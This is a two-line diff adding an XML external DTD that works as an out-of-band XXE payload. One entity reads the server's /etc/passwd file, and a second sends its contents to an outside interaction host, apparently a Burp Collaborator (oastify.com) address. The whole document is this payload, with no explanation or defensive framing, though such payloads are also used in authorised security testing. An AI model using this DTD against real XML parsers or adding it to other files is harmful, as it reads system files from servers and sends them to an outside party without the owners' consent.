@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://cvbt5w98llxvk1ik4iutrasj4aa9yy.oastify.com/?%data;'>">
